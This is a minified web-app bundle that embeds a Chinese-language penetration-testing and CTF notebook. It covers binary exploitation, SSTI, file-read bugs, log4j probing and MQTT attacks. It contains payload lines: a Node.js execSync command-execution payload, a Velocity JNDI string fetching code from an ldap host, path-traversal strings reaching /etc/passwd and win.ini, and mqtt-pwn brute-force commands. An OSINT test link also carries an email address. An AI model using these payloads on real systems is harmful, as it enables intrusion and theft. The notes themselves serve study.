                              \u8FD9\u6837\u7684\u8BDD\uFF0C\u5C31\u80FD\u591F\u4E92\u8865\u4E86\u3002

                      \u4E24\u8005\u4EA4\u4E92\uFF1A
                          \u590D\u5236\u3010\u5730\u5740\u3011\uFF0C\u7136\u540E\u641C\u7D22\u5373\u53EF\u3002

                  \u4EE5\u4E00\u4E2A\u3010\u653B\u51FB\u94FE\u3011\u4E3A\u4F8B\uFF0C\u5C0F\u9ED1\u7ED9\u6211\u8BB2\u4E86\uFF1A
                      \u9996\u5148\uFF0C\u4EE3\u7801\u7684\u70B9\uFF0C\u4F1A\u5F62\u6210\u3010\u4E00\u9897\u6811\u3011\u3002

                      \u53EF\u4EE5\u641C\u4E00\u4E9B\u3010system()\u3011\uFF0C\u5E38\u89C1\u7684\u70B9\uFF1B\u5012\u7740\u8FC7\u6765\u627E\uFF1A
                          \u627E\u5230\u5229\u7528\u70B9\uFF0C\u7136\u540E\u5F80\u4E0A\u5BFB\u627E\u3002
                              \u6BD4\u5982\uFF0C\u627E\u5230\u4E00\u4E9B\u3010\u53EF\u63A7\u5B57\u6BB5\u3011\uFF0C\u5C42\u5C42\u4F20\u9012

                          \u6211\u7684\u7406\u89E3\uFF1A
                              \u3010\u6E90\u3011\u2014\u2014\u6570\u636E\u6D41\u2014\u2014\u5229\u7528\u70B9

                  \u7ED9\u4E86\u6211\u4E00\u4E2Abin\u5305\uFF1A
                      \u53EF\u4EE5\u53BB\u67E5\u770B\u4FE1\u606F\u3002

            `,`

          IDA

              \u8D44\u6599\uFF1A
                  \u8BB2\u8FF0\u5F97\u5F88\u6E05\u695A\uFF1Ahttps://medium.com/@gabriel.pirjolescu/pwn-hack-the-box-ropme-write-up-b40179cf5573
                  \u53E6\u5916\u4E00\u7BC7\uFF0C\u539F\u7406\u975E\u5E38\u8BE6\u7EC6\u7684\u8BB2\u89E3\uFF1Ahttps://shaqed.github.io/htb-ropme/



              EAX \u5BC4\u5B58\u5668

              UaF
                  free()
                  \u6211\u4EEC\u4F1A\u770B\u5230\u5728 main_account \u4E0A\u8C03\u7528\u4E86free()\u4F46\u4ECE\u672A\u5220\u9664 main_account \u7684\u5185\u5BB9\u3002
                      \u8FD9\u610F\u5473\u7740\u6211\u4EEC\u4ECD\u7136\u53EF\u4EE5\u5728\u4ECE main_account \u91CA\u653E\u7F13\u51B2\u533A\u540E\u8BBF\u95EE\u5B83\u3002
                      \u56E0\u6B64\uFF0C\u8FD9\u88AB\u79F0\u4E3A\u91CA\u653E\u540E\u4F7F\u7528 (UaF)\u3002

                  \u66F4\u591A\u8D44\u6599\uFF1A
                      https://youtu.be/ZHghwsTRyzQ



              strdup()
                  malloc

              \u4F5C\u4E3A\u5B57\u7B26\u4E32\u8F93\u5165\u7684\u5185\u5BB9\u5C06\u4EE5\u5C0F\u7AEF\u683C\u5F0F\u5B58\u50A8
                  \u8FD9\u610F\u5473\u7740\u6BCF 4 \u4E2A\u5B57\u8282\uFF0C\u5B57\u6BCD\u5C06\u4EE5\u76F8\u53CD\u7684\u987A\u5E8F\u6392\u5217\u3002

              \u4E00\u4E9B\u4F7F\u7528\u65B9\u5F0F\uFF1A

                  main
                  \u653E\u7F6E\u4E00\u4E2A\u65AD\u70B9
                  ret

                  puts()
                      \u5B83\u88AB\u5B9A\u4E49\u4E3Aint puts(const char *s);
                      \u8FD9\u610F\u5473\u7740\u8FD9\u4E2A\u51FD\u6570\u53EA\u9700\u8981 1 \u4E2A\u53C2\u6570\uFF0C\u5B83\u662F\u4E00\u4E2A\u6307\u5411 cstring \u5F00\u5934\u7684\u6307\u9488\u3002

                  fflush()
                      fflush\u5176\u5B9A\u4E49\u4E3Aint fflush(FILE *stream);

                  \u5806\u6808\u5BF9\u9F50\u662F\u8C03\u7528\u51FD\u6570\u65F6\u7684\u4E8B\u60C5
                      \u5728\u4E0B\u6B21\u4F60\u51B3\u5B9A\u641E\u4E71\u8C03\u7528\u65F6\uFF0C\u8981\u8BB0\u4F4F

                  \u6CC4\u6F0F\u5730\u5740
                      \u4E0D\u4EC5\u53EF\u4EE5\u901A\u8FC7\u683C\u5F0F\u5B57\u7B26\u4E32\u5229\u7528\u6765\u5B8C\u6210\uFF0C
                      \u8FD8\u53EF\u4EE5\u901A\u8FC7 ROPing \u6765\u5B8C\u6210puts\uFF01

                      \u6CC4\u6F0F\u5730\u5740\u5E76\u5E0C\u671B\u5728\u65B0\u7684\u6709\u6548\u8D1F\u8F7D\u4E2D\u4F7F\u7528\u5B83\u65F6\uFF0C\u518D\u6B21\u5FAA\u73AF\u56DE main \u53EF\u4EE5\u5E2E\u52A9\u60A8


          `,`

          CodeBrowser

              123

          `))},{name:"\u3010Retargetable Decompiler\u3011 / \u3010RetDec\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          Retargetable Decompiler / RetDec
              \u7C7B\u4F3C\u4E8E\u3010IDA\u3011

          `))},{name:"\u3010ret2plt\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u3010GLIBC\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          GLIBC
              \u8D44\u6599\uFF1A
                  \u6211\u4EEC\u53EF\u4EE5\u4F7F\u7528\u4E00\u4E2A\u5DE5\u5177\u6765\u4E3A\u6211\u4EEC\u8FDB\u884C\u8BA1\u7B97\u3002\u4ECB\u7ECD\uFF1A
                      libc \u6570\u636E\u5E93\uFF1Ahttps://libc.blukat.me/

              \u8BA9\u6211\u4EEC\u5728 libc \u6570\u636E\u5E93\u4E2D\u67E5\u770B\u5B83\uFF0C\u4EE5\u4E86\u89E3\u8FDC\u7A0B\u673A\u5668\u4E0A\u7684 libc \u7248\u672C\uFF1A

              \u6211\u4EEC\u53EF\u80FD\u8FD8\u5FC5\u987B\u6CC4\u6F0Ffflush\u548Cfgets

          `))},{name:"\u3010pop rdi\u3011\u5C0F\u5DE5\u5177",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u3010pop rdi\u3011\u5C0F\u5DE5\u5177
              \u539F\u56E0\u662F x64 \u4E2D\u7684\u8C03\u7528\u7EA6\u5B9A\u662F \u53C2\u6570\u5B58\u50A8\u5728\u5BC4\u5B58\u5668\u4E2D\uFF0C\u7B2C\u4E00\u4E2A\u53C2\u6570\u5B58\u50A8\u5728rdi\u5BC4\u5B58\u5668\u4E2D\u3002

          `))},{name:"\u3010libc-database\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          libc-database
              Build a database of libc offsets \uFF0C\u6765\u7B80\u5316epx

              \u8D44\u6599\uFF1A
                  \u4ED3\u5E93\uFF1Ahttps://github.com/niklasb/libc-database
                  \u5C55\u793ADemo\uFF1Ahttps://libc.rip/

          `))}]},Zu=en,pn=k.e.singleATag_blank,xn={name:"\u3010\u53CD\u5E8F\u5217\u5316\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u3010YsoSerial\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4ECB\u7ECD\uFF1A
              YsoSerial

          `))}]},Ln=xn,Gn=k.e.singleATag_blank,hn={name:"\u3010DNS\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010dnslog.cn\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          dnslog.cn
              \u63A2\u6D4B\u3010log4j\u3011
              \u7406\u60F3\u60C5\u51B5\u4E0B\uFF0C\u6211\u4EEC\u5EFA\u8BAE\u60A8\u8BBE\u7F6E\u81EA\u5DF1\u7684 Burp Collaborator \u6216 Interactsh \u670D\u52A1\u5668\u6765\u6D4B\u8BD5\u6B64\u6F0F\u6D1E\u3002


          `))}]},dn=hn,Yn=k.e.singleATag_blank,Wn={name:"\u3010\u6D4F\u89C8\u5668\u3011_\u3010Firefox\u3011_\u3010Chrome\u3011_\u624B\u518C",steps:[{name:"\u3010FireFox\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          FireFox
              \u3010sessionstore-backups\u3011

              \u4E5F\u7ECF\u5E38\u53EF\u4EE5\uFF0C\u7528\u4F5C\u3010\u5355\u4E2A\u5173\u952E\u5B57\u3011\u67E5\u627E

          `))}]},dj=Wn,Zn=f("HJBr"),Qn=f("ONbu"),sj=f("qhoQ"),Fj=k.e.singleATag_blank,kj={name:"\u3010BlockChain\u3011_\u3010\u533A\u5757\u94FE\u3011_\u3010\u6570\u5B57\u8D27\u5E01\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u975E\u5E38\u8BE6\u7EC6\u7684\uFF0C\u3010\u533A\u5757\u94FE\u9632\u5B88\u624B\u518C\u3011\uFF0C\u7CFB\u7EDF\u5316\u7684\u8868\u8FF0\uFF1A

              \u533A\u5757\u94FE\u9ED1\u6697\u68EE\u6797\u81EA\u6551\u624B\u518C
                  \u8D44\u6599\uFF1Ahttps://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook

                  \u4F53\u7CFB\uFF1A
                      \u57FA\u672C\u77E5\u8BC6\uFF1A
                          \u521B\u5EFA\u94B1\u5305
                          \u5907\u4EFD\u94B1\u5305
                          \u4F7F\u7528\u94B1\u5305
                          \u4F20\u7EDF\u9690\u79C1\u4FDD\u62A4
                          \u4EBA\u6027\u5B89\u5168

                      \u533A\u5757\u94FE\u5E38\u89C1\u4F5C\u6076\u65B9\u5F0F
                          123

                      \u88AB\u76D7\uFF08\u5E01\uFF09\u4E86\u600E\u4E48\u529E
                          123

                      \u5BF9\u3010\u533A\u5757\u94FE\u653B\u51FB\u884C\u4E3A\u3011\u8BA4\u77E5\u8BEF\u533A
                          123

                      \u603B\u7ED3
                          123

          `))}]},Cj=kj,Pj=k.e.singleATag_blank,oj={name:"\u3010APP\u3011_\u3010Apk\u3011_\u3010Android\u3011_\u3010\u5B89\u5353\u3011_\u3010iOS\u3011_\u3010Apple\u3011_\u3010\u82F9\u679C\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5BF9\u3010\u77E5\u4E4EAPP\u3011\u7684\u5206\u6790\uFF1A
              1.\u300A\u77E5\u4E4E\u5206\u6790-Android\u5B89\u5168-\u770B\u96EA\u8BBA\u575B-\u5B89\u5168\u793E\u533A\u300B
                      https://bbs.pediy.com/thread-272184.htm

          \u76F8\u5173\u5DE5\u5177\uFF1A
              UniDbg

              Frida


          `))}]},Ej=oj,Bj=k.e.singleATag_blank,fj={name:"\u3010\u6EAF\u6E90\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u76F8\u5173\u8FFD\u8E2A\u8FC7\u7A0B\uFF1A
                  Fake dnSpy - \u5F53\u9ED1\u5BA2\u4E5F\u4E0D\u8BB2\u4F0D\u5FB7 - \u5B89\u5168\u5BA2\uFF0C\u5B89\u5168\u8D44\u8BAF\u5E73\u53F0
                          https://www.anquanke.com/post/id/265809

          \u5728\u7EBF\u5DE5\u5177\uFF1A
                  WebArchive
                          \u4E92\u8054\u7F51\uFF0C\u662F\u6709\u8BB0\u5FC6\u7684
                          https://wayback.archive.org/

                  EmailRecordsFinder
                          \u90AE\u4EF6\u8BB0\u5F55\u7684\u67E5\u627E\u5668\u3002

                          https://recordsfinder.com/email/
                                  \u6D4B\u8BD5\u94FE\u63A5\uFF1Ahttps://recordsfinder.com/search/email/results/?flow=email&email=CARBON1986%40PROTONMAIL.COM&country=US&transactionId=58e138893ea0ea6d1fdd7679d5d06164

          \u672C\u5730\u5DE5\u5177\uFF1A

                  Maltego
                          123

          `))}]},kn=fj,Uu=k.e.singleATag_blank,En={name:"\u3010SSTI\u3011_\u3010\u6A21\u677F\u6CE8\u5165\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD\u3001\u3010ServerSideTemplateInjection\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          Server-side template injection

          \u5E38\u89C1\u6A21\u677F\uFF1A
              {{7*7}}
              \${7*7}
              <%= 7*7 %>
              \${{7*7}}
              #{7*7}



          `))},{name:"\u3010Nodejs\u3011 / \u3010Node.js\u3011 ",desc:n.a.createElement(n.a.Fragment,null),steps:[{name:"\u3010\u6C99\u76D2\u3011 \uFF08\u3010sandbox\u3011\uFF09",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u7ECF\u5E38\u5B58\u5728\u3010\u6C99\u76D2sandbox\u3011\u3002
                  \u4EE3\u7801\u53D7\u9650\u3002

              Node.js\u7684\u3010\u5168\u5C40\u53D8\u91CFGlobal\u3011
                  \u8D44\u6599\uFF1A
                      https://nodejs.org/api/globals.html
                      https://stackoverflow.com/questions/43627622/what-is-the-global-object-in-nodejs#:~:text=While%20in%20browsers%20the%20global,be%20local%20to%20this%20module.&text=The%20global%20namespace%20object,scope%20is%20the%20global%20scope.

                  \u90E8\u5206\u3010\u770B\u4E0A\u53BB\u662F\u5168\u5C40\u3011\uFF0C\u800C\u5B9E\u9645\u4E0A\u53EA\u662F\u3010\u6A21\u5757\u5185\u4F5C\u7528\u57DF\u3011\uFF0C\u7684\u53D8\u91CF\u5217\u8868\uFF1A
                      \uFF08https://nodejs.org/api/globals.html#apicontent\uFF09
                      __dirname
                      __filename
                      exports
                      module
                      require()

                  \u5176\u5B83\u53EF\u7528\u7684\u3010\u771F\u6B63\u5168\u5C40\u3011\uFF0C\u7684\u53D8\u91CF\u5217\u8868\uFF1A
                      global
                      module
                      process
                      setTimeout

                  \u7279\u522B\u6709\u7528\u7684\uFF0C\u4E00\u4E9B\u53D8\u91CF\uFF1A

                      process.mainModule

                          \u51FA\u73B0\u5730\u70B9\uFF1A
                              https://nodejs.org/api/process.html#processmainmodule

                          \u4F7F\u7528\u65B9\u5F0F\uFF1A
                              \u8D44\u6599\uFF1Ahttps://www.geeksforgeeks.org/node-js-process-mainmodule-property/

                              process.mainModule.require("xxx").execSync("yyy")

                  \u7ED3\u679C\u67E5\u770B\uFF1A(\u6700\u540E\u4E00\u884C\uFF0C\u624D\u662F\u7ED3\u679C\u8F93\u51FA)
                      e
                      2
                      [object Object]
                      function Function() { [native code] }
                      2
                      [object Object]
                      [object Object]

              `))},{name:"\u540E\u7EED\u5229\u7528\u65B9\u5F0F",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u7B2C\u4E00\uFF0C\u83B7\u5F97\u300AReverse Shell\u300B\uFF0C\u53CD\u5411\u4EE3\u7406shell

              \u7B2C\u4E8C\uFF0C\u76F4\u63A5\u62FF\u5230\u300Aflag\u300B

              `))},{name:"\u3010HandleBars\u3011 \u6A21\u677F\u5F15\u64CE\u3001\u6A21\u677F\u8BED\u8A00",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(tn.a.SSTI.\u4ECB\u7ECD,tn.a.SSTI.\u76F8\u5173\u6280\u5DE7))}]},{name:"\u3010Java\u3011",desc:n.a.createElement(n.a.Fragment,null),steps:[{name:"\u3010Velocity\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              Velocity

              \u4ECB\u7ECD\uFF1A
                  Velocity \u662F\u4E00\u4E2A\u57FA\u4E8E Java \u7684\u6A21\u677F\u5F15\u64CE\u3002\u5B83\u5141\u8BB8\u4EFB\u4F55\u4EBA\u4F7F\u7528\u7B80\u5355\u800C\u5F3A\u5927\u7684\u6A21\u677F\u8BED\u8A00\u6765\u5F15\u7528 Java \u4EE3\u7801\u4E2D\u5B9A\u4E49\u7684\u5BF9\u8C61\u3002

              \u914D\u7F6E\u6587\u4EF6RCE
                  \u914D\u7F6E\u6587\u4EF6\uFF0C\u8FD9\u91CC\u53EF\u4EE5\u914D\u7F6E\u6211\u4EEC\u7684jndi\u5730\u5740\uFF0C\u6211\u4EEC\u9700\u8981\u627E\u5230\u4E00\u4E2Asource\u70B9
                      \u6BD4\u5982\u300A  org.apache.velocity.runtime.RuntimeInstance#init  \u300B\u3002

                      \u5229\u7528\u65B9\u5F0F\uFF1A
                          \u914D\u7F6E\u9879\uFF0C\u4F8B\u5982\u300A  ds.resource.loader.datasource_url = ldap://xxx:1389/TomcatBypass/Command/Base64/Y2FsYy5leGU=  \u300B


             `))}]}]},ln=En,bn=k.e.singleATag_blank,$n={name:"\u3010\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u3011_\u3010\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u3011_\u3010\u4EFB\u610F\u6587\u4EF6\u5305\u542B\u3011",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u540E\u7EED\u5371\u5BB3\uFF1A
              \u8BFB\u53D6\u6240\u6709\u6587\u4EF6\uFF0C\u8BFB\u53D6\u6240\u6709\u51ED\u8BC1

              \u5E38\u89C1\uFF1A
                  \u4F7F\u7528\u3010\u5185\u7F51\u6E17\u900F\u3011\u7684\u601D\u8DEF\uFF0C\u53BB\u505A\u540E\u7EED\u7684\u4E8B\u60C5\u3002
                      \u90A3\u4F7F\u7528\u7684\u9762\uFF0C\u53EF\u5C31\u592A\u5E7F\u4E86

          `))},{name:"\u5E38\u7528\u3010\u63A2\u6D4B\u8DEF\u5F84\u3011",desc:n.a.createElement(n.a.Fragment,null),content:Promise.resolve().then(f.bind(null,"QL8i")).then(function(sn){var mn=sn.\u5E38\u89C1\u9690\u79C1\u6587\u4EF6_\u654F\u611F\u6587\u4EF6_\u91CD\u8981\u914D\u7F6E\u6587\u4EF6_Helper,Cn=mn.Windows;return mn.Linux.then(function(me){return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
              https://www.1rql.com/3721.html
              https://99836.vip/2021/09/03/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%96%87%E6%A1%A3.html
              \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5C0F\u7ED3 - Dis-a - \u535A\u5BA2\u56ED    https://www.cnblogs.com/appear001/p/11149996.html

          Windows
              \u57FA\u672C\u4F7F\u7528\u65B9\u5F0F\uFF1A
                  \u76F8\u5BF9\u8DEF\u5F84\uFF1A
                      \u3010../../windows/win.ini\u3011
                      \uFF08\u6CE8\u610F\uFF0C\u5411\u4E0A\u63A2\u5BFB\u53EF\u4EE5\u65E0\u9650\u957F\u3002\u90FD\u4E0D\u4F1A\u62A5\u9519\uFF09
                          \u3010../../../../../../../../../../../../../../../../../../../../../../../../../../windows/win.ini\u3011
                  \u7EDD\u5BF9\u8DEF\u5F84\uFF1A
                      \u3010c:/windows/win.ini\u3011
                      \u3010file:///c:/windows/win.ini\u3011
                          \u3010\u7B2C\u4E00\u4E2A\u53CC//\u3011\u4EE3\u8868\u534F\u8BAE\u3001\u3010\u7B2C\u4E09\u4E2A\u5355/\u3011\u4EE3\u8868\u6839\u8DEF\u5F84\u3002
                  \u5173\u952E\u8981\u70B9\uFF1A
                      \u3010\u7EDD\u5BF9\u8DEF\u5F84\u3011\u6216\u8005\u3010\u76F8\u5BF9\u8DEF\u5F84\u3011\uFF0C\u540C\u65F6\u53EA\u4F7F\u7528\u4E00\u6B21\u3002
          `,Cn,`
          Linux
              \u57FA\u672C\u4F7F\u7528\u65B9\u5F0F\uFF1A
                  \u548CWindows\u5927\u540C\u5C0F\u5F02\uFF1A
                      \u5DEE\u522B\u70B9\uFF1A
                          \u3010\u5206\u9694\u7B26\u3011\u7684\u6B63\u659C\u6760\u3001\u53CD\u659C\u6760\u3002
                          \u3010\u76D8\u7B26\u3011\u7684\u5207\u6362\u3002
                  \u4E3E\u4F8B\uFF1A
                      \u3010/etc/passwd\u3011
                      \u3010file:///etc/passwd\u3011
                          \u3010\u7B2C\u4E00\u4E2A\u53CC//\u3011\u4EE3\u8868\u534F\u8BAE\u3001\u3010\u7B2C\u4E09\u4E2A\u5355/\u3011\u4EE3\u8868\u6839\u8DEF\u5F84\u3002
            `,me))})})}]},Rn=$n,_n=k.e.singleATag_blank,Hn={name:"\u3010\u7269\u8054\u7F51\u3011_\u3010MQTT\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4ECB\u7ECD\uFF1A
              \u548C\u7269\u8054\u7F51\u76F8\u5173\u3002
                  MQTT\u6D88\u606F\u961F\u5217\u9065\u6D4B\u4F20\u8F93\uFF08\u82F1\u8BED\uFF1AMessage Queuing Telemetry Transport\uFF09\u3002
                  \u57FA\u4E8E\u53D1\u5E03 (Publish)/\u8BA2\u9605 (Subscribe)\u8303\u5F0F\u7684\u6D88\u606F\u534F\u8BAE
              \u539F\u7406\uFF1A
                  \u5B83\u5DE5\u4F5C\u5728 TCP/IP\u534F\u8BAE\u65CF\u4E0A\u3002
                  \u662F\u4E3A\u786C\u4EF6\u6027\u80FD\u4F4E\u4E0B\u7684\u8FDC\u7A0B\u8BBE\u5907\u4EE5\u53CA\u7F51\u7EDC\u72B6\u51B5\u7CDF\u7CD5\u7684\u60C5\u51B5\u4E0B\u800C\u8BBE\u8BA1\u7684\u53D1\u5E03/\u8BA2\u9605\u578B\u6D88\u606F\u534F\u8BAE\u3002
                      \u7279\u522B\u9002\u5408\u4E8E\u3010\u7269\u8054\u7F51\u3011\u573A\u666F\u3002
              \u8D44\u6599\uFF1A
                  https://t.zsxq.com/nYzRrbU
                      \u5C55\u793A MQTT \u5728 C2 \u4E2D\u7684\u4F7F\u7528\u4EE5\u53CA\u7269\u8054\u7F51\u4E91\u670D\u52A1\u4E0E\u690D\u5165\u7269\u96C6\u6210\u7684\u65B9\u5F0F\u3002
                          \u57FA\u4E8EMQTT\u534F\u8BAE\u7684C2\uFF0C\u5229\u7528IoT\u4E91\u7684\u5404\u79CD\u57FA\u7840\u8BBE\u65BD\u6765\u4F5C\u4E3AC2\u7684\u57FA\u7840\u8BBE\u65BD\u3002

          `))},{name:"\u3010mqtt-pwn\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  \u6846\u67B6\u4F7F\u7528\uFF1A
      mqtt-pwn
          \u8D44\u6599\uFF1A
              \u4ED3\u5E93\u5730\u5740\uFF1Ahttps://github.com/akamai-threat-research/mqtt-pwn.git
          \u542F\u52A8CLI\u6D41\u7A0B\uFF1A
              docker\u542F\u52A8\u65B9\u5F0F\uFF1A
                  docker-compose  up  --build  --detach
                      \u4EE5\u5206\u79BB\u6A21\u5F0F\u6784\u5EFA\u548C\u521B\u5EFA\u6211\u4EEC\u7684\u5BB9\u5668\uFF0C\u8FD9\u610F\u5473\u7740\u5B83\u4EEC\u5C06\u5728\u540E\u53F0\u8FD0\u884C\u3002
              \u67E5\u770B\u72B6\u6001\uFF1A
                  docker-compose  ps
              \u542F\u52A8cli
                  docker-compose  run  cli
          \u57FA\u672C\u4F7F\u7528\uFF1A
              connect
                  connect  -o  <Host\u4E3B\u673A>
                      \u5982\u679C\u6CA1\u63D0\u793A\u3010\u8FDE\u63A5\u5931\u8D25\u3011\uFF0C\u90A3\u5C31\u662F\u6210\u529F\u4E86\u3002
                          \u53EF\u4EE5\u7528\u3010system_info\u3011\u8FDB\u884C\u786E\u8BA4\u3002
                      \u767B\u4E0D\u8FDB\u53BB\uFF0C\u5C31\u53EF\u4EE5\u3010\u7206\u3011
                          \u6709\u65F6\u5019\uFF0C\u3010\u7206\u3011\u4E86\u518D\u56DE\u6765\u767B\uFF0C\u5C31\u53EF\u4EE5\u4E86\uFF1F\uFF1F\uFF1F
              system_info
                  \u67E5\u770B\uFF0C\u57FA\u672C\u4FE1\u606F\u3002\uFF08\u4EC5\u5728\u3010\u6210\u529F\u8FDE\u63A5\u3011\u60C5\u51B5\u4E0B\uFF0C\u6709\u6548\uFF09

              disconnect

              bruteforce
                  \u5BC6\u7801\u7206\u7834\u6A21\u5757
                  bruteforce  --host  <\u4E3B\u673A>  --port  <\u7AEF\u53E3>  -uf  <\u7528\u6237\u540D\u8BCD\u5178\uFF0C\u6BD4\u5982resources/wordlists/usernames.txt>  -pf  <\u5BC6\u7801\u8BCD\u5178\uFF0C\u6BD4\u5982resources/wordlists/passwords.txt>
              discovery
                  \u542F\u52A8\u3010scans\u3011\u626B\u63CF

              sonoff
                  \u4ECB\u7ECD\uFF1ASonoff \u8BBE\u5907\u503E\u5411\u4E8E\u6309\u9700\u5171\u4EAB\u67D0\u4E9B\u4FE1\u606F\u3002 \u8BE5\u6A21\u5757\u4E3B\u52A8\u67E5\u627E\u8FD9\u4E9B\u4FE1\u606F\u3002
                  sonoff
                      \u76F4\u63A5\u5F00\u59CB\u67E5\u627E\uFF0C\u663E\u793A\u3010  [!] Sonoff exploit running ...  \u3011
              scans
                  scans
                      \u67E5\u770B\u3010\u626B\u63CF\u3011\u60C5\u51B5
                  scans  -i  <\u626B\u63CF\u7684ID>
                      \uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                  \u76F8\u5173\u5B50\u547D\u4EE4\uFF1A

                          messages
                              \u9700\u8981\u5148\u8FDB\u5165\u3010\u67D0\u4E2Ascan\u3011

                              messages
                                  \u663E\u793A\u3010\u6536\u5230\u6D88\u606F\u3011
                          owntracks
                              \u9700\u8981\u5148\u8FDB\u5165\u3010\u67D0\u4E2Ascan\u3011

                              owntracks
                                  \u663E\u793A \u3010\u7528\u6237 + \u8BBE\u5907 + \u5750\u6807\u3011 \u3002
                          topics
                              \u9700\u8981\u5148\u8FDB\u5165\u3010\u67D0\u4E2Ascan\u3011

                              topics
                                  \u663E\u793A\u3010\u8BA2\u9605\u901A\u9053 \u76F8\u5173\u3011


              \u5176\u5B83\u64CD\u4F5C
                  back
                      back  <scan\u6216victim>
                          \u8FD4\u56DE\u5230\u4E0A\u4E00\u7EA7
                  edit  <\u6587\u4EF6\u8DEF\u5F84>
